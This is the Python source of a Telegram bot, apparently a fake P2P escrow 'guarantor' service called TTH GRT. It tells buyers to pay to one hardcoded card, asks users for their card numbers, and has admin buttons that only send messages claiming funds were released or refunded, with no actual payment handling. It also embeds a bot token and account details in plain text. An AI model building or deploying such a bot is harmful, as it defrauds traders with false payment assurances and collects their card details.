import asyncio
import random
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# ===== Настройки =====
API_TOKEN = '8030481560:AAE15GipYIF6UeJlzFkggED8kWxG5spi2zY'
ADMIN_ID = 7880438865  # ID администратора
RECEIVER_CARD = "2204120118196936"  # Реквизиты, на которые переводятся средства
BOT_USERNAME = "TTHGRTbot"  # Без символа @

# ===== Инициализация =====
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Глобальный словарь для хранения данных по сделкам
deals = {}

# ===== Определяем состояния =====
class Form(StatesGroup):
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_product = State()
    waiting_for_payment_screenshot = State()
    waiting_for_transfer_screenshot = State()
    waiting_for_card_number = State()  # Для функции "Добавить карту"

# ===== Обработчик команды /start =====
@dp.message(CommandStart())
async def start_handler(message: types.Message, state: FSMContext):
    # Получаем аргументы команды вручную (в aiogram 3.9.0 get_args() удалён)
    parts = message.text.split(maxsplit=1)
    args = parts[1] if len(parts) > 1 else ""
    
    if args and args.startswith("deal_"):
        try:
            deal_id = args.split("_")[1]
        except IndexError:
            await message.answer("⚠️ Неверный формат ссылки.", parse_mode="HTML")
            return
        if deal_id not in deals:
            await message.answer("⚠️ Сделка не найдена или уже завершена.", parse_mode="HTML")
            return
        # Регистрируем продавца в сделке
        deals[deal_id]["seller_id"] = message.from_user.id
        await message.answer(
            f"🔹 <b>Вы зашли в сделку #{deal_id}</b>\n\n"
            "📸 Отправьте скриншот, подтверждающий передачу товара.",
            parse_mode="HTML"
        )
        await state.set_state(Form.waiting_for_transfer_screenshot)
    else:
        # Если аргументов нет – стандартное приветствие
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💰 Создать сделку", callback_data="create_deal")],
            [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")]
        ])
        await message.answer(
            "🎉 <b>Добро пожаловать в TTH GRT</b> – надежный P2P-гарант!\n\n"
            "💼 <b>Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            "Выберите нужный раздел ниже:",
            reply_markup=keyboard,
            parse_mode="HTML"
        )

# ===== Функция "Добавить карту" =====
@dp.callback_query(F.data == "add_card")
async def add_card(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите номер вашей карты (16 цифр):", parse_mode="HTML")
    await state.set_state(Form.waiting_for_card_number)
    await callback.answer()

@dp.message(Form.waiting_for_card_number)
async def process_card_number(message: types.Message, state: FSMContext):
    if not re.match(r"^\d{16}$", message.text):
        await message.reply("❌ Введите корректный номер карты (16 цифр).", parse_mode="HTML")
        return
    # Здесь можно сохранить карту пользователя (например, в базу или словарь)
    await message.answer("✅ Ваша карта сохранена!", parse_mode="HTML")
    await state.clear()

# ===== Создание сделки (инициатор – покупатель) =====
@dp.callback_query(F.data == "create_deal")
async def create_deal(callback: types.CallbackQuery, state: FSMContext):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💵 USD", callback_data="currency_usd")],
        [InlineKeyboardButton(text="💴 RUB", callback_data="currency_rub")],
        [InlineKeyboardButton(text="💎 Crypto", callback_data="currency_crypto")]
    ])
    await bot.send_message(callback.from_user.id, "Выберите валюту для сделки:", reply_markup=keyboard, parse_mode="HTML")
    await state.set_state(Form.waiting_for_currency)
    await callback.answer()

@dp.callback_query(F.data.startswith("currency_"))
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split('_')[1]
    # Генерируем уникальный номер сделки, например, случайное число от 1000 до 9999
    deal_id = f"{random.randint(1000, 9999)}"
    # Формируем ссылку для продавца
    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    await state.update_data(currency=currency, deal_id=deal_id, deal_link=deal_link)
    await bot.send_message(callback.from_user.id,
        f"🔹 <b>Сделка #{deal_id}</b>\n\n"
        f"Вы выбрали валюту: {currency}.\nВведите сумму сделки.",
        parse_mode="HTML")
    await state.set_state(Form.waiting_for_amount)
    await callback.answer()

@dp.message(Form.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer("📦 Введите товар для сделки:", parse_mode="HTML")
        await state.set_state(Form.waiting_for_product)
    except ValueError:
        await message.reply("❌ Введите корректную сумму сделки.", parse_mode="HTML")

@dp.message(Form.waiting_for_product)
async def process_product(message: types.Message, state: FSMContext):
    data = await state.get_data()
    deal_id = data["deal_id"]
    deal_link = data["deal_link"]
    product = message.text
    amount = data["amount"]
    currency = data["currency"]
    
    # Сохраняем данные сделки в глобальном словаре
    deals[deal_id] = {
        "buyer_id": message.from_user.id,
        "seller_id": None,
        "amount": amount,
        "currency": currency,
        "product": product,
        "buyer_screenshot": None,
        "seller_screenshot": None
    }
    
    await state.update_data(product=product)
    
    await message.answer(
        f"✅ <b>Сделка #{deal_id} создана!</b>\n\n"
        f"📌 <b>Товар:</b> {product}\n"
        f"💰 <b>Сумма:</b> {amount} {currency}\n\n"
        f"💳 Отправьте {amount} {currency} на карту <b>{RECEIVER_CARD}</b>.\n\n"
        f"🔗 Передайте продавцу эту ссылку для участия в сделке: <a href=\"{deal_link}\">Войти в сделку</a>\n\n"
        "📸 После оплаты отправьте скриншот оплаты.",
        parse_mode="HTML"
    )
    await state.set_state(Form.waiting_for_payment_screenshot)

@dp.message(Form.waiting_for_payment_screenshot, F.photo)
async def process_payment_screenshot(message: types.Message, state: FSMContext):
    data = await state.get_data()
    deal_id = data["deal_id"]
    # Сохраняем скрин покупателя в сделке
    deals[deal_id]["buyer_screenshot"] = message.photo[-1].file_id
    await message.answer("📸 Скриншот оплаты получен! Ожидаем, когда продавец отправит скриншот передачи товара.", parse_mode="HTML")
    # Пересылаем скрин админу
    await bot.send_photo(ADMIN_ID, message.photo[-1].file_id,
        caption=f"📩 <b>Сделка #{deal_id}</b>\n\n✅ Покупатель отправил скриншот оплаты.",
        parse_mode="HTML")
    await state.clear()

@dp.message(Form.waiting_for_transfer_screenshot, F.photo)
async def process_transfer_screenshot(message: types.Message, state: FSMContext):
    # Определяем, к какой сделке относится продавец
    seller_deal_id = None
    for d_id, deal in deals.items():
        if deal.get("seller_id") == message.from_user.id and deal.get("seller_screenshot") is None:
            seller_deal_id = d_id
            break
    if seller_deal_id is None:
        await message.answer("⚠️ Сделка не найдена или уже обработана.", parse_mode="HTML")
        return
    deals[seller_deal_id]["seller_screenshot"] = message.photo[-1].file_id
    await message.answer("📸 Скриншот передачи товара получен!", parse_mode="HTML")
    # Формируем инлайн-клавиатуру для подтверждения сделки администратором
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить сделку", callback_data=f"confirm_{seller_deal_id}")],
        [InlineKeyboardButton(text="❌ Вернуть деньги покупателю", callback_data=f"refund_{seller_deal_id}")]
    ])
    await bot.send_message(ADMIN_ID,
        f"📢 <b>Сделка #{seller_deal_id}</b> ожидает подтверждения.\n\n"
        "Проверьте скриншоты оплаты и передачи товара.",
        reply_markup=keyboard,
        parse_mode="HTML")
    await state.clear()

# ===== Обработчики для администратора =====
@dp.callback_query(F.data.startswith("confirm_"))
async def admin_confirm(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[1]
    deal = deals.get(deal_id)
    if not deal:
        await callback.message.answer("⚠️ Сделка не найдена.", parse_mode="HTML")
        return
    buyer_id = deal.get("buyer_id")
    seller_id = deal.get("seller_id")
    await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} подтверждена администратором. Деньги переведены продавцу.", parse_mode="HTML")
    if seller_id:
        await bot.send_message(seller_id, f"✅ Сделка #{deal_id} подтверждена администратором. Деньги отправлены вам.", parse_mode="HTML")
    await callback.message.answer(f"✅ Сделка #{deal_id} подтверждена.", parse_mode="HTML")
    del deals[deal_id]

@dp.callback_query(F.data.startswith("refund_"))
async def admin_refund(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[1]
    deal = deals.get(deal_id)
    if not deal:
        await callback.message.answer("⚠️ Сделка не найдена.", parse_mode="HTML")
        return
    buyer_id = deal.get("buyer_id")
    seller_id = deal.get("seller_id")
    await bot.send_message(buyer_id, f"❌ Сделка #{deal_id} отменена администратором. Деньги возвращены вам.", parse_mode="HTML")
    if seller_id:
        await bot.send_message(seller_id, f"❌ Сделка #{deal_id} отменена администратором.", parse_mode="HTML")
    await callback.message.answer(f"❌ Сделка #{deal_id} отменена. Деньги возвращены покупателю.", parse_mode="HTML")
    del deals[deal_id]

# ===== Запуск бота =====
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
